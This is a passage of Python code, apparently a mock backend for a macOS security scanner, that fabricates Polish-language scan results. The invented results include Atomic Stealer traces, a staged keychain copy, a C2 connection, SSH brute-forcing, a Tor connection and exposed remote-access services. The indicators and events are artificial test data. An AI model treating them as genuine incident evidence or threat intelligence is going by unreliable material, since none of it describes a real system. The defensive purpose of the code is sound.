        {"category": "posture", "title": "Zapora sieciowa macOS jest wyłączona", "location": "Ustawienia systemowe › Sieć › Zapora",
         "severity": "low", "score": 10, "description": "Przy włączonym udostępnianiu usług zapora ogranicza, kto może się połączyć.",
         "evidence": ["socketfilterfw --getglobalstate: disabled"]},
        {"category": "ssh", "title": "Klucz w ~/.ssh/authorized_keys", "location": f"{h}/.ssh/authorized_keys",
         "severity": "info", "score": 2, "description": "Ten klucz pozwala zalogować się na konto bez hasła, gdy włączone jest Zdalne logowanie.",
         "evidence": ["ssh-ed25519 AAAAC3Nz…q9Lw jan@macbook-stary (dodany 2025-03-14)"]},
        {"category": "process", "title": "Proces bez podpisu uruchomiony z ~/Library/Application Support",
         "location": f"{h}/Library/Application Support/.helper/agent (pid 4312)", "severity": "suspicious", "score": 45,
         "description": "Niepodpisany plik Mach-O w ukrytym katalogu, uruchomiony przez launchd z agenta powyżej.",
         "evidence": ["codesign: code object is not signed at all", "rodzic: launchd (1)", "uruchomiony 2026-10-06 08:02"]},
    ]
    if not CLEAN:
        findings.append(
            {"category": "artifacts", "title": "Ślady Atomic Stealer (AMOS): 3 artefakty",
             "location": f"{h}/Library/Application Support/.helper", "severity": "malicious", "score": 100,
             "description": "Pliki i nazwy znane z kampanii Atomic macOS Stealer (AMOS) – kradnie hasła z pęku kluczy, "
                            "ciasteczka i hasła przeglądarek oraz portfele kryptowalut.",
             "evidence": [f"{h}/Library/Application Support/.helper/update.sh – nazwa i miejsce jak w kampaniach AMOS",
                          f"{h}/Library/LaunchAgents/com.apple.softwareupdate.helper.plist – etykieta podszywająca się pod Apple",
                          "/tmp/.k – kopia pęku kluczy przygotowana do wysłania"]})
    if level == "mega" and not CLEAN:
        findings += [
            {"category": "syslog", "title": "Atak na hasło SSH: 37 nieudanych prób w 4 minuty",
             "location": "Dziennik systemowy › sshd", "severity": "suspicious", "score": 45,
             "description": "Ktoś z internetu próbował zgadnąć hasło przez Zdalne logowanie (SSH), a potem zalogował "
                            "się z tego samego adresu.",
             "evidence": ["2026-10-05 23:50–23:54: 37 × „Failed password” z 203.0.113.5",
                          "2026-10-05 23:58: „Accepted password” z 203.0.113.5"]},
            {"category": "certs", "title": "Zaufany certyfikat narzędzia do podsłuchu HTTPS: Charles Proxy",
             "location": "Pęk kluczy › Ustawienia zaufania użytkownika", "severity": "low", "score": 10,
             "description": "Certyfikat Charles Proxy jest zaufany dla HTTPS – pozwala odczytać szyfrowany ruch, "
                            "jeśli działa proxy Charles.",
             "evidence": ["CN=Charles Proxy CA (7 Mar 2026, MacBook-Jana.local)", "zaufanie: SSL, tylko to konto"]},
        ]
    if level == "mega":
        findings += [
            {"category": "network", "title": "Połączenie z serwerem C2 z listy ThreatFox",
             "location": f"{h}/Library/Application Support/.helper/agent (pid 4312) → 185.220.101.47:8443",
             "severity": "malicious", "score": 100,
             "description": "Proces utrzymuje połączenie z adresem oznaczonym w ThreatFox jako serwer C2 stealera AMOS.",
             "evidence": ["ThreatFox: 185.220.101.47:8443 – AMOS Stealer botnet C2 (2026-09-21)",
                          "wysłano 48,2 MB od uruchomienia systemu"]},
            {"category": "remote_access", "title": "Udostępnianie ekranu jest włączone",
             "location": "Ustawienia systemowe › Ogólne › Udostępnianie", "severity": "low", "score": 10,
             "description": "Każdy w tej samej sieci może spróbować połączyć się z ekranem (port 5900).",
             "evidence": ["screensharingd nasłuchuje na *:5900"]},
        ]
    return {"findings": findings,
            "posture": {"sip": True, "gatekeeper": True, "filevault": True, "firewall": "off",
                        "xprotect_version": "5321", "auto_updates": True, "macos": "26.5.1"},
            "limitations": ["Bez Full Disk Access nie sprawdzono bazy TCC ani elementów w tle (BTM).",
                            "Zadania cron innych użytkowników wymagają uprawnień administratora."]}


def network_section():
    h = HOME
    agent = f"{h}/Library/Application Support/.helper/agent"
    listening = [
        {"proto": "tcp4", "address": "*", "port": 4444, "exposure": "all", "process": "agent", "pid": 4312,
         "exe": agent, "signer": None, "service": None},
        {"proto": "tcp4", "address": "*", "port": 5900, "exposure": "all", "process": "screensharingd", "pid": 611,
         "exe": "/System/Library/CoreServices/RemoteManagement/screensharingd.bundle/Contents/MacOS/screensharingd",
         "signer": "Apple", "service": "Udostępnianie ekranu"},
        {"proto": "tcp4", "address": "*", "port": 22, "exposure": "all", "process": "sshd", "pid": 1,
         "exe": "/usr/sbin/sshd", "signer": "Apple", "service": "Zdalne logowanie (SSH)"},
        {"proto": "tcp6", "address": "*", "port": 7000, "exposure": "all", "process": "ControlCenter", "pid": 702,
         "exe": "/System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter", "signer": "Apple",
         "service": "Odbiornik AirPlay"},
        {"proto": "udp4", "address": "*", "port": 5353, "exposure": "all", "process": "mDNSResponder", "pid": 389,
         "exe": "/usr/sbin/mDNSResponder", "signer": "Apple", "service": "Bonjour (mDNS)"},
        {"proto": "tcp4", "address": "192.168.1.23", "port": 3000, "exposure": "specific", "process": "node", "pid": 9921,
         "exe": "/opt/homebrew/Cellar/node/24.9.0/bin/node", "signer": "ad-hoc", "service": None},
        {"proto": "tcp4", "address": "127.0.0.1", "port": 11434, "exposure": "localhost", "process": "ollama", "pid": 1290,
         "exe": "/Applications/Ollama.app/Contents/Resources/ollama", "signer": "Developer ID: Ollama Inc.", "service": None},
        {"proto": "tcp6", "address": "::1", "port": 6463, "exposure": "localhost", "process": "Discord", "pid": 2001,
         "exe": "/Applications/Discord.app/Contents/MacOS/Discord", "signer": "Developer ID: Discord, Inc.", "service": None},
        {"proto": "tcp4", "address": "127.0.0.1", "port": 4040, "exposure": "localhost", "process": "ngrok", "pid": 7731,
         "exe": "/opt/homebrew/bin/ngrok", "signer": "Developer ID: ngrok LLC", "service": "Panel ngrok"},
    ]
    conns = [
        ("agent", 4312, agent, "185.220.101.47", 8443, None, "ThreatFox: AMOS Stealer – serwer C2 botnetu"),
        ("Google Chrome Helper", 1880, "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Helpers/Google Chrome Helper.app",
         "142.250.186.206", 443, "waw07s05-in-f14.1e100.net", None),
        ("Google Chrome Helper", 1880, "", "172.217.16.3", 443, "fra16s56-in-f3.1e100.net", None),
        ("Slack Helper", 2210, "/Applications/Slack.app", "3.124.55.10", 443, "wss-primary.slack.com", None),
        ("Spotify", 2402, "/Applications/Spotify.app", "35.186.224.25", 443, "audio-ak.spotifycdn.com", None),
        ("Dropbox", 1502, "/Applications/Dropbox.app", "162.125.69.18", 443, "client.dropbox.com", None),
        ("Code Helper", 3011, "/Applications/Visual Studio Code.app", "140.82.121.4", 443, "lb-140-82-121-4-fra.github.com", None),
        ("ssh", 9120, "/usr/bin/ssh", "51.75.140.22", 22, "vps.example.pl", None),
        ("ngrok", 7731, "/opt/homebrew/bin/ngrok", "3.125.209.94", 443, "tunnel.eu.ngrok.com", None),
        ("Mail", 1012, "/System/Applications/Mail.app", "142.250.102.108", 993, "imap.gmail.com", None),
        ("identityservicesd", 498, "/System/Library/PrivateFrameworks/IDS.framework", "17.57.146.53", 5223, "courier.push.apple.com", None),
        ("zoom.us", 3330, "/Applications/zoom.us.app", "170.114.52.2", 443, "zoom.us", None),
        ("Discord", 2001, "/Applications/Discord.app", "162.159.135.234", 443, "gateway.discord.gg", None),
        ("rapportd", 455, "/usr/libexec/rapportd", "192.168.1.10", 49152, "iPhone-Jana.local", None),
    ]
    connections = [{"process": p, "pid": pid, "exe": exe, "remote": ip, "port": port, "host": host,
                    "state": "ESTABLISHED", "public": not ip.startswith("192.168."), "ioc": ioc}
                   for p, pid, exe, ip, port, host, ioc in conns]
    traffic = [
        ("Google Chrome Helper", 1880, 412_300_112, 6_802_331_004, "Developer ID: Google LLC"),
        ("Dropbox", 1502, 980_200_400, 1_302_118_000, "Developer ID: Dropbox, Inc."),
        ("Spotify", 2402, 22_118_004, 912_440_812, "Developer ID: Spotify"),
        ("zoom.us", 3330, 302_118_700, 488_200_331, "Developer ID: Zoom Video Communications, Inc."),
        ("Slack Helper", 2210, 18_400_221, 201_330_118, "Developer ID: Slack Technologies, Inc."),
        ("agent", 4312, 48_212_330, 1_204_998, None),
        ("Code Helper", 3011, 4_201_118, 88_340_221, "Developer ID: Microsoft Corporation"),
        ("Mail", 1012, 2_118_400, 64_220_118, "Apple"),
        ("ssh", 9120, 9_312_004, 2_118_330, "Apple"),
        ("ngrok", 7731, 3_220_118, 3_908_221, "Developer ID: ngrok LLC"),
        ("Discord", 2001, 1_402_330, 22_330_118, "Developer ID: Discord, Inc."),
        ("identityservicesd", 498, 812_330, 1_220_400, "Apple"),
        ("softwareupdated", 377, 330_118, 1_204_330_118, "Apple"),
    ]
    traffic_items = [{"process": p, "pid": pid, "exe": "", "bytes_out": o, "bytes_in": i, "signer": s}
                     for p, pid, o, i, s in traffic]
    remote_access = [
        {"name": "Nieznany agent (.helper/agent)", "kind": "app", "status": "running",
         "detail": "Niepodpisany proces z ukrytego katalogu: nasłuchuje na porcie 4444 i łączy się z serwerem C2.",
         "risk": "malicious"},
        {"name": "Tunel ngrok", "kind": "tunnel", "status": "running",
         "detail": "Aktywny tunel tcp://0.tcp.eu.ngrok.io:14523 → localhost:22 – port SSH dostępny z internetu.",
         "risk": "suspicious"},
        {"name": "Udostępnianie ekranu", "kind": "macos_service", "status": "enabled",
         "detail": "screensharingd nasłuchuje na *:5900 (wszystkie interfejsy).", "risk": "low"},
        {"name": "Zdalne logowanie (SSH)", "kind": "macos_service", "status": "enabled",
         "detail": "sshd nasłuchuje na *:22; 1 klucz w ~/.ssh/authorized_keys.", "risk": "low"},
        {"name": "AnyDesk", "kind": "app", "status": "installed",
         "detail": "/Applications/AnyDesk.app – zainstalowany, nieuruchomiony, brak usługi w tle.", "risk": "info"},
        {"name": "Klucze SSH", "kind": "ssh_keys", "status": "present",
         "detail": "~/.ssh: 2 klucze prywatne (id_ed25519, id_rsa), 1 wpis w authorized_keys.", "risk": "info"},
        {"name": "Zarządzanie urządzeniem (MDM)", "kind": "mdm", "status": "disabled",
         "detail": "Brak profilu MDM i rejestracji DEP – komputer nie jest zarządzany zdalnie.", "risk": "info"},
    ]
    sessions = [
        {"user": os.environ.get("USER", "jan"), "tty": "console", "from": None, "since": "2026-10-06 08:01"},
        {"user": os.environ.get("USER", "jan"), "tty": "ttys001", "from": None, "since": "2026-10-06 09:12"},
        {"user": os.environ.get("USER", "jan"), "tty": "ttys004", "from": "192.168.1.5", "since": "2026-10-06 11:47"},
    ]
    logins = [
        {"user": os.environ.get("USER", "jan"), "tty": "ssh", "from": "203.0.113.5", "when": "2026-10-05 23:58", "remote": True},
        {"user": os.environ.get("USER", "jan"), "tty": "ttys004", "from": "192.168.1.5", "when": "2026-10-06 11:47", "remote": True},
        {"user": os.environ.get("USER", "jan"), "tty": "console", "from": None, "when": "2026-10-06 08:01", "remote": False},
        {"user": os.environ.get("USER", "jan"), "tty": "console", "from": None, "when": "2026-10-05 07:44", "remote": False},
        {"user": "_mbsetupuser", "tty": "console", "from": None, "when": "2026-10-01 07:58", "remote": False},
    ]
    return {
        "boot_time": "2026-10-01 07:58:12",
        "summary": {"listening_all_interfaces": sum(1 for l in listening if l["exposure"] == "all"),
                    "public_connections": 37, "processes_online": 21,
                    "remote_tools": sum(1 for r in remote_access if r["status"] in ("running", "enabled")),
                    "ioc_hits": sum(1 for c in connections if c["ioc"]),
                    "uploaded_bytes_since_boot": sum(t["bytes_out"] for t in traffic_items)},
        "listening": listening, "connections": connections, "traffic": traffic_items,
        "traffic_history": {"available": False,
                            "reason": "historia ruchu (nettop -L / pliki NetworkUsage) wymaga uprawnień administratora",
                            "items": []},
        "remote_access": remote_access, "sessions": sessions, "logins": logins,
        "syslog": syslog_section(), "lan": lan_section(), "certificates": certificates_section(),
    }


def syslog_section():
    """`network.syslog`: what macOS logged in the last 7 days (default variant: an SSH password attack)."""
    t = _dt.datetime.now()
    fmt = "%Y-%m-%d %H:%M"
    counts = {"xprotect_scans": 58, "xprotect_detections": 0, "xprotect_blocks": 0, "gatekeeper_blocks": 1,
              "gatekeeper_overrides": 0 if CLEAN else 1, "ssh_accepted": 0 if CLEAN else 2,
              "ssh_failed": 0 if CLEAN else 37, "screen_sharing_ok": 0, "screen_sharing_failed": 0,
              "auth_failures": 1 if CLEAN else 3, "privileged_authorizations": 4, "new_login_items": 0 if CLEAN else 1,
              "privacy_prompts": 2}
    events = [] if CLEAN else [
        {"time": "2026-10-05 23:54", "category": "remote_login", "severity": "suspicious",
         "title": "37 nieudanych prób logowania przez SSH w 4 minuty",
         "detail": "Z adresu 203.0.113.5 (internet) – typowy atak na hasło. Chwilę później 1 udane logowanie z tego "
                   "samego adresu.", "process": "sshd-session"},
        {"time": "2026-10-04 18:20", "category": "gatekeeper", "severity": "low",
         "title": "Obejście Gatekeepera: QuickConvert.app",
         "detail": "Aplikacja bez notaryzacji została otwarta mimo ostrzeżenia („Otwórz mimo to”).", "process": "syspolicyd"},
        {"time": "2026-10-02 23:41", "category": "persistence", "severity": "low",
         "title": "Nowy element w tle: com.apple.softwareupdate.helper",
         "detail": "Zarejestrowany przez launchd – to ten sam agent co w znaleziskach środowiska.",
         "process": "backgroundtaskmanagementd"},
    ]
    events += [
        {"time": "2026-10-03 11:05", "category": "gatekeeper", "severity": "info",
         "title": "Gatekeeper zablokował: Faktura.app",
         "detail": "Aplikacja z podpisem ad-hoc została zablokowana przy pierwszym uruchomieniu.", "process": "syspolicyd"},
        {"time": t.strftime(fmt), "category": "xprotect", "severity": "info",
         "title": "XProtect: 58 skanów, bez wykryć",
         "detail": "Wbudowany skaner Apple sprawdzał nowe i zmienione pliki – nic nie znalazł.", "process": "XProtect"},
        {"time": "2026-10-06 09:30", "category": "authorization", "severity": "info",
         "title": "Autoryzacje administratora: 4",
         "detail": "Instalator i Ustawienia systemowe prosiły o hasło administratora.", "process": "authd"},
    ]
    counts["events_total"] = len(events)
    return {"available": True, "reason": None,
            "window": {"from": (t - _dt.timedelta(days=7)).strftime(fmt), "to": t.strftime(fmt),
                       "days": {"security": 7.0, "privacy": 0.5},
                       "persist_since": (t - _dt.timedelta(hours=41)).strftime(fmt),
                       "special_since": (t - _dt.timedelta(days=15)).strftime(fmt)},
            "counts": counts, "events": events}


def lan_section():
    """`network.lan`: router, Wi‑Fi security, DHCP and neighbours (nothing suspicious in either variant)."""
    return {"gateway": {"ip": "192.168.1.1", "mac": "00:00:5e:00:53:02", "interface": "en0", "mac_randomized": False},
            "wifi": {"interface": "en0", "connected": True, "security": "WPA2 Personal", "security_level": "wpa2",
                     "security_label": "WPA2", "ssid": "MojaSiec-5G", "source": "airport"},
            "dhcp": {"dhcp_server": "192.168.1.1", "router": "192.168.1.1", "dns": ["192.168.1.1", "1.1.1.1"],
                     "domain": "home", "router_arp_verified": True},
            "arp_entries": 7, "arp_suspicious": [],
            "arp_multi_ip": [{"mac": "00:00:5e:00:53:03", "interface": "en0", "ips": ["192.168.1.10", "192.168.1.11"]}],
            "ipv6_routers": [{"router": "fe80::a691:b1ff:fe2c:7e3", "interface": "en0", "pref": "medium", "expire": "29m"}]}


def certificates_section():
    """`network.certificates`: manually trusted certificates (default variant: Charles Proxy)."""
    if CLEAN:
        return []
    name = "Charles Proxy CA (7 Mar 2026, MacBook-Jana.local)"
    return [{"name": name, "domain": "user", "trust": "ssl", "policies": ["sslServer"],
             "subject": f"CN={name}, OU=https://charlesproxy.com/ssl, O=XK72 Ltd, L=Auckland, C=NZ",
             "issuer": f"CN={name}, OU=https://charlesproxy.com/ssl, O=XK72 Ltd, L=Auckland, C=NZ",
             "not_before": "2026-03-07", "not_after": "2027-03-07", "expired": False, "is_ca": True,
             "self_signed": True, "sha256": sha(name), "kind": "interception_tool", "tool": "Charles Proxy",
             "risk": "low",
             "explanation": "Certyfikat narzędzia do podglądania ruchu HTTPS. Jeśli używasz Charlesa do programowania – "
                            "w porządku; jeśli nie, usuń go z pęku kluczy, bo pozwala odczytać Twój szyfrowany ruch."}]


class LiveNetMonitor:
    """Mega: after the start audit the real backend polls the network every 5 s until the scan ends and reports
    only what is new. The mock "polls" from the file stages (`tick`), about every 0.5 s (every tick without
    sleeps), and plays a fixed script of events at given points of the scan."""

    INTERVAL = 5
    # (stage, fraction) → event; `alert` events also become a `network_live` environment finding.
    SCRIPT = [
        (("enumerate", 0.5), {
            "kind": "listen", "severity": "info",
            "title": "Nowy port nasłuchujący: node na porcie 3000 (dostępny w sieci lokalnej)",
            "detail": "Serwer deweloperski node zaczął nasłuchiwać na 192.168.1.23:3000 – widać go tylko w sieci lokalnej.",
            "process": "node", "pid": 9921, "exe": "/opt/homebrew/Cellar/node/24.9.0/bin/node",
            "remote": None, "host": None, "signer": "ad-hoc"}),
        (("scan", 0.15), {
            "kind": "inbound", "severity": "info",
            "title": "Połączenie przychodzące z sieci lokalnej: iPhone-Jana.local → rapportd",
            "detail": "Urządzenie Apple w tej samej sieci połączyło się z usługą Ciągłość/AirDrop – to normalne.",
            "process": "rapportd", "pid": 455, "exe": "/usr/libexec/rapportd",
            "remote": "192.168.1.10:49812", "host": "iPhone-Jana.local", "signer": "Apple"}),
        (("scan", 0.3), {
            "kind": "connection", "severity": "suspicious", "alert": True,
            "title": "Nowe połączenie skryptu na nietypowym porcie: python3 → 185.220.101.4:9001",
            "detail": "Skrypt ~/Library/Application Support/.helper/sync.py łączy się z adresem z sieci Tor "
                      "(port 9001 – typowy dla przekaźników Tor). Wcześniej tego połączenia nie było.",
            "process": "python3", "pid": 5120, "exe": "/usr/bin/python3",
            "remote": "185.220.101.4:9001", "host": None, "signer": "Apple",
            "confidence": "medium", "attack": "c2", "trust": "apple", "ioc": True,
            "target": os.path.expanduser("~/Library/Application Support/.helper/sync.py"),
            "evidence": ["Skrypt z ukrytego folderu łączy się z przekaźnikiem Tor [185.220.101.4:9001]",
                         "Adres na liście zagrożeń (węzły Tor)", "Port 9001 – typowy dla przekaźników Tor"],
            "signals": ["NetWatch.Script.UnusualPort", "NetWatch.IocConnection"]}),
        (("scan", 0.7), {
            "kind": "traffic", "severity": "info",
            "title": "Duże wysyłanie: Dropbox wysłał 412 MB w trakcie skanu",
            "detail": "Podpisana aplikacja synchronizuje pliki z chmurą – sprawdź, czy to spodziewane.",
            "process": "Dropbox", "pid": 1502, "exe": "/Applications/Dropbox.app/Contents/MacOS/Dropbox",
            "remote": "162.125.69.18:443", "host": "client.dropbox.com", "signer": "Developer ID: Dropbox, Inc."}),
    ]
    NEW_PUBLIC = [
        ("Google Chrome Helper", 1880, "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Helpers/Google Chrome Helper.app",
         "142.250.203.142", 443, "waw07s06-in-f14.1e100.net", "Developer ID: Google LLC"),
        ("Slack Helper", 2210, "/Applications/Slack.app/Contents/Frameworks/Slack Helper.app", "3.66.12.104", 443,
         "edgeapi.slack.com", "Developer ID: Slack Technologies, Inc."),
        ("softwareupdated", 377, "/System/Library/PrivateFrameworks/SoftwareUpdate.framework/softwareupdated",
         "17.253.53.207", 443, "swcdn.apple.com", "Apple"),
        ("Code Helper", 3011, "/Applications/Visual Studio Code.app/Contents/Frameworks/Code Helper.app", "13.107.5.80", 443,
         "marketplace.visualstudio.com", "Developer ID: Microsoft Corporation"),
        ("Spotify", 2402, "/Applications/Spotify.app/Contents/MacOS/Spotify", "35.186.224.47", 443,
         "spclient.wg.spotify.com", "Developer ID: Spotify"),
        ("Google Chrome Helper", 1880, "", "151.101.1.69", 443, "cdn.sstatic.net", "Developer ID: Google LLC"),
        ("Dropbox", 1502, "/Applications/Dropbox.app/Contents/MacOS/Dropbox", "162.125.69.18", 443, "client.dropbox.com",
         "Developer ID: Dropbox, Inc."),
        ("zoom.us", 3330, "/Applications/zoom.us.app/Contents/MacOS/zoom.us", "170.114.10.85", 443, "us05web.zoom.us",
         "Developer ID: Zoom Video Communications, Inc."),
        ("trustd", 312, "/usr/libexec/trustd", "17.253.23.201", 80, "ocsp2.apple.com", "Apple"),
        ("Mail", 1012, "/System/Applications/Mail.app/Contents/MacOS/Mail", "142.250.102.109", 587, "smtp.gmail.com", "Apple"),
    ]

    def __init__(self):
        self.started = now()
        self.t_start = time.time()
        self.last = 0.0
        self.polls = 0
        self.seq = 0
        self.events = []
        self.alerts = []
        self.new_public = []
        self.pending = [] if CLEAN else list(self.SCRIPT)
        if CLEAN:
            self.pending = [e for e in self.SCRIPT if not e[1].get("alert")]
        self.local_new = 0
        self.out = {"Google Chrome Helper": [0, 0], "Dropbox": [0, 0], "Slack Helper": [0, 0], "Mail": [0, 0]}
        self.stats = {"connections_new": 0, "public_new": 0, "listening_new": 0, "inbound": 0, "sessions_new": 0,
                      "processes_remote": 0, "uploaded_bytes": 0, "alerts": 0}
        log("Monitor sieci na żywo: start – od teraz co 5 s sprawdzam, co nowego pojawia się w sieci")
        self.poll()
        self._status(True)

    def _status(self, active):
        emit("net_status", active=active, since=self.started, polls=self.polls, interval_s=self.INTERVAL, **self.stats)

    def _event(self, item):
        self.seq += 1
        ev = {"id": f"ne-{self.seq}", "time": _dt.datetime.now().strftime("%H:%M:%S"),
              **{k: v for k, v in item.items() if k != "alert"}}
        kind = ev["kind"]
        if kind == "listen":
            self.stats["listening_new"] += 1
        elif kind == "inbound":
            self.stats["inbound"] += 1
        elif kind == "connection" and ev.get("remote"):
            ip, _, port = ev["remote"].rpartition(":")
            self._public(ev["process"], ev["pid"], ev["exe"], ip, int(port), ev.get("host"), ev.get("signer"))
            self.out[ev["process"]] = [1_204_330, 88_120]
        elif kind == "traffic":
            self.out.setdefault(ev["process"], [0, 0])[0] += 412_000_000
        if ev["severity"] != "info":
            self.stats["alerts"] += 1
            self.alerts.append(ev)
        self.events.append(ev)
        emit("net_event", item=ev)

    def _public(self, process, pid, exe, ip, port, host, signer):
        self.new_public.append({"time": _dt.datetime.now().strftime("%H:%M:%S"), "process": process, "pid": pid,
                                "exe": exe, "remote": ip, "port": port, "host": host, "signer": signer})
        self.stats["public_new"] = len(self.new_public)

    def poll(self):
        self.polls += 1
        self.last = time.time()
        if len(self.new_public) < len(self.NEW_PUBLIC) and self.polls % 2 == 1:
            self._public(*self.NEW_PUBLIC[len(self.new_public)])
        if self.polls % 3 == 0 and self.local_new < 16:
            self.local_new += 1
        for name, (o, i) in self.out.items():
            self.out[name] = [o + rnd.randint(20_000, 900_000), i + rnd.randint(100_000, 4_000_000)]
        self.stats["connections_new"] = self.stats["public_new"] + self.local_new
        self.stats["uploaded_bytes"] = sum(o for o, _ in self.out.values())

    def tick(self, stage_id, fraction):
        """Called from the file stages; plays the script and reports a poll about every 0.5 s."""
        fired = False
        while self.pending and self.pending[0][0][0] == stage_id and fraction >= self.pending[0][0][1]:
            self._event(self.pending.pop(0)[1])
            fired = True
        if fired or NOSLEEP or time.time() - self.last >= 0.5 / SPEED:
            self.poll()
            self.stats["uploaded_bytes"] = sum(o for o, _ in self.out.values())
            self._status(True)

    def stop(self, total_seconds):
        """Final `net_status` (active: false) and the `network.monitor` section. The mock's scans pretend to take
        hours (`seconds` in the summary), so the monitor's time range and poll count follow that, not the clock."""
        self.poll()
        self._status(False)
        log(f"Monitor sieci na żywo: koniec – {len(self.events)} zdarzeń, alarmów: {self.stats['alerts']}")
        seconds = max(1.0, round(total_seconds - 140.0, 1))
        start = _dt.datetime.strptime(self.started, "%Y-%m-%d %H:%M:%S")
        known = {p[0]: (p[1], p[2], p[6]) for p in reversed(self.NEW_PUBLIC)}
        known["python3"] = (5120, "/usr/bin/python3", "Apple")
        uploads = [{"process": name, "pid": known.get(name, (None, "", None))[0], "exe": known.get(name, (None, "", None))[1],
                    "bytes_out": o, "bytes_in": i, "signer": known.get(name, (None, "", None))[2]}
                   for name, (o, i) in sorted(self.out.items(), key=lambda kv: -kv[1][0])][:15]
        return {"started": self.started,
                "ended": (start + _dt.timedelta(seconds=seconds)).strftime("%Y-%m-%d %H:%M:%S"),
                "seconds": seconds, "polls": int(seconds // self.INTERVAL), "interval_s": self.INTERVAL,
                "stats": dict(self.stats), "events": self.events[:300], "new_public": self.new_public[:300],
                "uploads": uploads,
                "limitations": ["Monitor sprawdza sieć co 5 s – bardzo krótkie połączenia (trwające ułamek sekundy) "
                                "mogą zostać pominięte.",
                                "Ilość wysłanych danych pochodzi z nettop i dotyczy tylko procesów, które działały "
                                "w chwili sprawdzenia."]}

    def findings(self):
        """Monitor alerts (severity ≥ low) as `network_live` environment findings."""
        return [{"category": "network_live", "title": ev["title"],
                 "location": f"{ev['exe']} (pid {ev['pid']}) → {ev['remote']}" if ev.get("remote") else ev.get("exe"),
                 "severity": ev["severity"], "score": 35, "description": ev["detail"],
                 "evidence": [f"monitor sieci na żywo, {ev['time']}", "port 9001 – typowy dla przekaźników Tor",
                              "połączenia nie było w audycie na starcie skanu"]}
                for ev in self.alerts]


def cmd_laptop(level, ai):
    labels = {"quick": "Szybki", "patterns": "Średni", "deep": "Dokładny", "mega": "Mega"}
    title = f"Laptop – {labels.get(level, level)}"
    environment = None
    network = None
    if level in ("deep", "mega"):
        stage("env", "Skanowanie środowiska (autostart, procesy, rozszerzenia, ustawienia)…")
        for msg in ["LaunchAgents/LaunchDaemons: 64 wpisy", "Elementy logowania i pliki rc powłoki",
                    "Procesy: 412 (podpisy, łańcuchy osascript)", "Rozszerzenia przeglądarek: 23",
                    "SIP, Gatekeeper, FileVault, zapora, XProtect"]:
            log(msg)
            nap(0.35)
        environment = environment_findings(level)
        emit("error", msg="Brak uprawnień Full Disk Access – część ustawień prywatności (TCC) pominięto.",
             fatal=False)
    if level == "mega":
        stage("network", "Audyt sieci i zdalnego dostępu…")
        for msg in ["Porty nasłuchujące (lsof -i): 9", "Połączenia aktywne: 52, publiczne: 37",
                    "Ruch per proces od uruchomienia (nettop)", "Narzędzia zdalnego dostępu, tunele, MDM",
                    "Sesje i ostatnie logowania (who, last)", "Porównanie adresów z ThreatFox/URLhaus: 1 trafienie"]:
            log(msg)
            nap(0.35)
        if os.environ.get("CERBER_MOCK_NETFAIL") == "1":
            emit("error", msg="Audyt sieci na starcie nie powiódł się: lsof przekroczył limit czasu.", fatal=False)
        else:
            network = network_section()
    # Mega: from here until the end of the scan the network is watched live (net_status / net_event).
    monitor = LiveNetMonitor() if level == "mega" else None

    def tick(stage_id):
        return (lambda fraction: monitor.tick(stage_id, fraction)) if monitor else None

    readonly_sandbox_stage()
    load_stage()
    stage("enumerate", "Wyszukiwanie plików w kluczowych miejscach…" if level == "quick"
          else "Wyszukiwanie plików na całym komputerze…")
    total = 48_213 if level == "quick" else 1_284_551
    for k in range(1, 9):
        emit("progress", stage="enumerate", found=int(total * k / 8))
        if monitor:
            monitor.tick("enumerate", k / 8)
        nap(0.15)
    stage("scan", "Skanowanie plików…")
    # Mega includes AI whenever the model can run.
    use_ai = (ai or level == "mega") and ai_usable()
    files = synthetic_files(700, base=HOME, system=level != "quick")
    dl = os.path.join(HOME, "Downloads")
    planned = {} if CLEAN else {
        9: finding_eicar(dl),
        27: finding_script(os.path.join(HOME, "Library/Application Support/.helper/update.sh"),
                           ai=use_ai),
        44: finding_pua("/Applications/Advanced Mac Cleaner.app"),
        60: finding_info_adhoc(os.path.join(dl, "QuickConvert.app/Contents/MacOS/QuickConvert")),
    }
    found, _, done = run_scan_loop(files, planned, total_files=total, label_every=14, on_step=tick("scan"))
    cloud = cloud_stage(on_step=tick("cloud")) if level == "mega" and not CANCELLED else None
    if level in ("deep", "mega"):
        behavior_stage(found, on_step=tick("behavior"))
    if use_ai and not CANCELLED:
        ai_stage(found, on_step=tick("ai"))
    seconds = {"quick": 251.4, "patterns": 3712.0, "deep": 14230.8, "mega": 16902.5}.get(level, 100.0)
    if monitor:
        network = dict(network or {}, monitor=monitor.stop(seconds))
        if environment is not None:
            environment["findings"] += monitor.findings()
    finish("laptop", level, title, done, 412_008_331_220 if level != "quick" else 38_200_118_004, found,
           seconds=seconds, environment=environment, network=network, skipped=128, sandbox=READONLY_SANDBOX,
           cloud_only=5120 if level != "quick" else 0, cloud_fetch=cloud,
           errors=["Brak uprawnień: /Library/Application Support/com.apple.TCC"] if level in ("deep", "mega") else [])


# ------------------------------------------------------------------------------------------ main

# --------------------------------------------------------------------------------------- iPhone (cable / backup)

IPHONE_MODE = os.environ.get("CERBER_MOCK_IPHONE", "")
IPHONE_UDID = "00008110-001A2B3C4D5E801E"


def _iphone_backup():
    enc = IPHONE_MODE == "encrypted"
    return {"path": f"{HOME}/Library/Application Support/MobileSync/Backup/{IPHONE_UDID}", "udid": IPHONE_UDID,
            "device_name": "iPhone (Ania)", "model": "iPhone 13", "product_type": "iPhone14,5", "ios": "17.6.1",
            "date": "2026-10-12 21:14", "encrypted": enc, "passcode_set": True, "complete": True, "full": False,
            "source": "finder"}


def cmd_iphone_devices():
    nap(0.6)
    none = IPHONE_MODE == "none"
    backups = [] if none else [_iphone_backup()]
    devices = [] if none else [{
        "udid": IPHONE_UDID, "name": "iPhone (Ania)", "model": "iPhone 13", "product_type": "iPhone14,5",
        "ios": "17.6.1", "state": "usb", "trusted": True, "sources": ["devicectl", "usb"], "paired": True,
        "last_seen": "2026-10-13 09:41", "backup": backups[0] if backups else None}]
    notes = ([] if not none else [
        "Brak narzędzi do odczytu iPhone'a przez kabel (libimobiledevice ani Xcode). Cerber widzi podłączony telefon, "
        "ale nie odczyta z niego listy aplikacji ani raportów awarii. Możesz je zainstalować samodzielnie: brew install "
        "libimobiledevice ideviceinstaller (Cerber niczego nie instaluje). Kopie zapasowe z Findera i tak zostaną "
        "przeanalizowane.",
        "Nie znaleziono kopii zapasowej iPhone'a. Zrób ją w Finderze: podłącz iPhone'a kablem → Finder → iPhone → "
